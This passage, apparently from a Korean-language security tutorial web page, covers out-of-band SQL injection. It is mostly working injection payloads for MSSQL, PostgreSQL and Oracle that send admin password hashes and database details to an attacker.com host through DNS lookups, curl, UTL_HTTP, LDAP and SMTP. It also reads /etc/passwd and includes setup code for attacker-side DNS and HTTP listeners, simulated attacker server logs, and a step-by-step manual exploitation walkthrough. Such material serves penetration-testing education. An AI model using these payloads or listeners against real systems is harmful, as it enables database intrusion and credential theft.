plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 비밀번호 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @pass VARCHAR(1024); SET @pass=(SELECT TOP 1 password FROM users WHERE username=&#x27;</span><span class="token plain">admin</span><span class="token string" style="color:#e3116c">&#x27;); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@pass+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>공격자 DNS 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">master.attacker.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">admin.attacker.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5f4dcc3b5aa765d61d8327deb882cf99.attacker.com</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="xp_fileexist">xp_fileexist<a href="#xp_fileexist" class="hash-link" aria-label="Direct link to xp_fileexist" title="Direct link to xp_fileexist" translate="no">​</a></h4>
<p>비슷한 방식:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(1024); SET @data=(SELECT @@version); EXEC(&#x27;</span><span class="token plain">xp_fileexist </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="xp_subdirs">xp_subdirs<a href="#xp_subdirs" class="hash-link" aria-label="Direct link to xp_subdirs" title="Direct link to xp_subdirs" translate="no">​</a></h4>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; EXEC xp_subdirs &#x27;</span><span class="token plain">\\attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com\</span><span class="token keyword" style="color:#00009f">share</span><span class="token plain">&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="fn_xe_file_target_read_file-sql-server-2012">fn_xe_file_target_read_file (SQL Server 2012+)<a href="#fn_xe_file_target_read_file-sql-server-2012" class="hash-link" aria-label="Direct link to fn_xe_file_target_read_file (SQL Server 2012+)" title="Direct link to fn_xe_file_target_read_file (SQL Server 2012+)" translate="no">​</a></h4>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; SELECT * FROM fn_xe_file_target_read_file(&#x27;</span><span class="token plain">\\attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com\</span><span class="token keyword" style="color:#00009f">share</span><span class="token plain">\</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xel&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="postgresql">PostgreSQL<a href="#postgresql" class="hash-link" aria-label="Direct link to PostgreSQL" title="Direct link to PostgreSQL" translate="no">​</a></h3>
<p>PostgreSQL도 Out-of-Band 가능:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="copy-to-program">COPY TO PROGRAM<a href="#copy-to-program" class="hash-link" aria-label="Direct link to COPY TO PROGRAM" title="Direct link to COPY TO PROGRAM" translate="no">​</a></h4>
<p><strong>명령 실행 + HTTP 전송</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; COPY (SELECT password FROM users WHERE username=&#x27;</span><span class="token plain">admin</span><span class="token string" style="color:#e3116c">&#x27;) TO PROGRAM &#x27;</span><span class="token plain">curl http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?data=$(cat)&#x27;--</span><br></span></code></pre></div></div>
<p><strong>공격자 웹 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /?data=5f4dcc3b5aa765d61d8327deb882cf99 HTTP/1.1</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="lo_importlo_export">lo_import/lo_export<a href="#lo_importlo_export" class="hash-link" aria-label="Direct link to lo_import/lo_export" title="Direct link to lo_import/lo_export" translate="no">​</a></h4>
<p><strong>대용량 데이터 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; SELECT lo_import(&#x27;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">etc</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">passwd&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dblink_connect">dblink_connect<a href="#dblink_connect" class="hash-link" aria-label="Direct link to dblink_connect" title="Direct link to dblink_connect" translate="no">​</a></h4>
<p>외부 DB 연결로 데이터 전송:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; SELECT dblink_connect(&#x27;</span><span class="token plain">host</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com </span><span class="token keyword" style="color:#00009f">user</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">postgres password</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">pass dbname</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">db</span><span class="token string" style="color:#e3116c">&#x27;)--</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> dblink_exec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;INSERT INTO log VALUES ((SELECT password FROM users))&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="oracle">Oracle<a href="#oracle" class="hash-link" aria-label="Direct link to Oracle" title="Direct link to Oracle" translate="no">​</a></h3>
<p>Oracle은 <strong>다양한 Out-of-Band 옵션</strong> 제공:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="utl_http">UTL_HTTP<a href="#utl_http" class="hash-link" aria-label="Direct link to UTL_HTTP" title="Direct link to UTL_HTTP" translate="no">​</a></h4>
<p><strong>HTTP 요청으로 데이터 전송</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?data=&#x27;||(SELECT password FROM users WHERE username=&#x27;admin&#x27;))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<p><strong>공격자 웹 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /?data=5f4dcc3b5aa765d61d8327deb882cf99 HTTP/1.1</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="utl_inaddr-dns-exfiltration">UTL_INADDR (DNS Exfiltration)<a href="#utl_inaddr-dns-exfiltration" class="hash-link" aria-label="Direct link to UTL_INADDR (DNS Exfiltration)" title="Direct link to UTL_INADDR (DNS Exfiltration)" translate="no">​</a></h4>
<p><strong>DNS 조회로 데이터 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com</span><span class="token string" style="color:#e3116c">&#x27;)=&#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>DNS 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5f4dcc3b5aa765d61d8327deb882cf99.attacker.com</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dbms_ldap">DBMS_LDAP<a href="#dbms_ldap" class="hash-link" aria-label="Direct link to DBMS_LDAP" title="Direct link to DBMS_LDAP" translate="no">​</a></h4>
<p><strong>LDAP 요청 이용</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND DBMS_LDAP.INIT((SELECT password FROM users WHERE ROWNUM=1)||&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">attacker</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">com</span><span class="token string" style="color:#e3116c">&#x27;, 80)=&#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="utl_smtp">UTL_SMTP<a href="#utl_smtp" class="hash-link" aria-label="Direct link to UTL_SMTP" title="Direct link to UTL_SMTP" translate="no">​</a></h4>
<p><strong>이메일 전송</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">DECLARE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  v_mail_conn UTL_SMTP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">connection</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  v_data VARCHAR2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">BEGIN</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> password </span><span class="token keyword" style="color:#00009f">INTO</span><span class="token plain"> v_data </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  v_mail_conn :</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> UTL_SMTP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">OPEN_CONNECTION</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;attacker.com&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  UTL_SMTP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">MAIL</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v_mail_conn</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;db@victim.com&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  UTL_SMTP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">RCPT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v_mail_conn</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;attacker@attacker.com&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  UTL_SMTP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">DATA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v_mail_conn</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  UTL_SMTP</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">QUIT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v_mail_conn</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">END</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="수동-공격-manual-exploitation">수동 공격 (Manual Exploitation)<a href="#수동-공격-manual-exploitation" class="hash-link" aria-label="Direct link to 수동 공격 (Manual Exploitation)" title="Direct link to 수동 공격 (Manual Exploitation)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-1-공격자-서버-준비">단계 1: 공격자 서버 준비<a href="#단계-1-공격자-서버-준비" class="hash-link" aria-label="Direct link to 단계 1: 공격자 서버 준비" title="Direct link to 단계 1: 공격자 서버 준비" translate="no">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dns-서버-설정">DNS 서버 설정<a href="#dns-서버-설정" class="hash-link" aria-label="Direct link to DNS 서버 설정" title="Direct link to DNS 서버 설정" translate="no">​</a></h4>
<p><strong>Burp Collaborator 사용 (권장)</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Burp Suite Professional에 내장</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Burp → Project options → Collaborator → &quot;Use Burp Collaborator server&quot;</span><br></span></code></pre></div></div>
<p>생성된 도메인 예시:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">abc123xyz.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>DNSLog.cn (무료 온라인 서비스)</strong>:</p>
<ol>
<li><a href="https://dnslog.cn/" target="_blank" rel="noopener noreferrer">https://dnslog.cn/</a> 접속</li>
<li>&quot;Get SubDomain&quot; 클릭</li>
<li>생성된 도메인 확인:<!-- -->
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xyz123.dnslog.cn</span><br></span></code></pre></div></div>
</li>
</ol>
<p><strong>자체 DNS 서버 (고급)</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Python으로 간단한 DNS 서버</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip3 install dnslib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># dns_server.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from dnslib import *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from dnslib.server import DNSServer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import datetime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class DnsLogger(object):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    def resolve(self, request, handler):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        reply = request.reply()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        qname = str(request.q.qname)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print(f&quot;[{datetime.datetime.now()}] DNS Query: {qname}&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # A 레코드 응답</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        reply.add_answer(RR(qname, QTYPE.A, rdata=A(&quot;1.2.3.4&quot;), ttl=60))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return reply</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logger = DnsLogger()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">resolver = DNSServer(logger, port=53, address=&quot;0.0.0.0&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">resolver.start_thread()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print(&quot;DNS Server started on port 53&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">input(&quot;Press Enter to stop\n&quot;)</span><br></span></code></pre></div></div>
<p>실행:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 dns_server.py</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="http-서버-설정">HTTP 서버 설정<a href="#http-서버-설정" class="hash-link" aria-label="Direct link to HTTP 서버 설정" title="Direct link to HTTP 서버 설정" translate="no">​</a></h4>
<p><strong>Python HTTP 서버</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 포트 80에서 실행</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -m http.server 80</span><br></span></code></pre></div></div>
<p><strong>PHP 간단한 로거</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// logger.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$data = $_GET[&#x27;data&#x27;] ?? &#x27;No data&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$time = date(&#x27;Y-m-d H:i:s&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file_put_contents(&#x27;log.txt&#x27;, &quot;[$time] $data\n&quot;, FILE_APPEND);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;OK&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre></div></div>
<p>실행:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php -S 0.0.0.0:80 logger.php</span><br></span></code></pre></div></div>
<p><strong>Netcat 리스너</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 간단한 HTTP 리스너</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while true; do nc -lvp 80; done</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-2-out-of-band-취약점-테스트">단계 2: Out-of-Band 취약점 테스트<a href="#단계-2-out-of-band-취약점-테스트" class="hash-link" aria-label="Direct link to 단계 2: Out-of-Band 취약점 테스트" title="Direct link to 단계 2: Out-of-Band 취약점 테스트" translate="no">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="mssql-예시">MSSQL 예시<a href="#mssql-예시" class="hash-link" aria-label="Direct link to MSSQL 예시" title="Direct link to MSSQL 예시" translate="no">​</a></h4>
<p><strong>1. 기본 DNS 요청 테스트</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 페이로드</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; EXEC xp_dirtree &#x27;</span><span class="token plain">\\abc123xyz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">burpcollaborator</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">net\a&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>URL</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://example.com/product?id=1&#x27;; EXEC xp_dirtree &#x27;\\abc123xyz.burpcollaborator.net\a&#x27;--</span><br></span></code></pre></div></div>
<p><strong>Burp Collaborator 확인</strong>:</p>
<ul>
<li>DNS 쿼리 수신 → <strong>취약점 존재</strong></li>
</ul>
<p><strong>2. 데이터베이스 이름 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @db VARCHAR(1024); SET @db=(SELECT DB_NAME()); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@db+&#x27;.abc123xyz.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
